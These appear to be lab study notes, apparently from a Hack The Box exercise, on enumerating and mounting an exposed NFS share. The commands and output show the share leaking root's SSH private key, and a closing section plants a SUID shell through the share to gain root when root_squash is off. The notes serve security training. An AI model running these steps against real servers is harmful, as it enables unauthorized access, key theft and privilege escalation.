
### **1. Discover Available NFS Shares**

Use `showmount` to list exported shares from the target:

```bash
showmount -e <TARGET_IP>
```

**Example:**

```bash
showmount -e 10.129.14.128
```

**Output:**

```
Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

---

### **2. Mount the NFS Share**

Create a local directory, then mount the share:

```bash
mkdir target-NFS
sudo mount -t nfs <TARGET_IP>:/ ./target-NFS/ -o nolock
cd target-NFS
```

**Example:**

```bash
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
```

Check structure:

```bash
tree .
```

**Output:**

```
.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share
```

---

### **3. Enumerate Files and Permissions**

#### **List with Usernames & Groups**

```bash
ls -l mnt/nfs/
```

**Output:**

```
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

---

#### **List with UIDs & GIDs**

```bash
ls -n mnt/nfs/
```

**Output:**

```
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

---

### **4. Key Notes**

- If **root_squash** is set:
    
    - Even root on the local machine **cannot modify** certain files like `backup.sh`.
        
- Matching the **usernames, groups, UIDs, and GIDs** locally allows you to **gain proper access** to the files.
    

---

### **5. Privilege Escalation Example**

If you have SSH access as a user:

1. Upload a **SUID shell** into the NFS share:
    
    ```bash
    gcc -o suid_shell suid_shell.c
    chmod +s suid_shell
    cp suid_shell ./target-NFS/
    ```
    
2. SSH into the target and run:
    
    ```bash
    ./suid_shell
    ```
    

> This only works if **root_squash** is **disabled** or **misconfigured**.

### Unmount NFS

```bash
z3tssu@htb[/htb]$ cd ..

z3tssu@htb[/htb]$ sudo umount ./target-NFS
```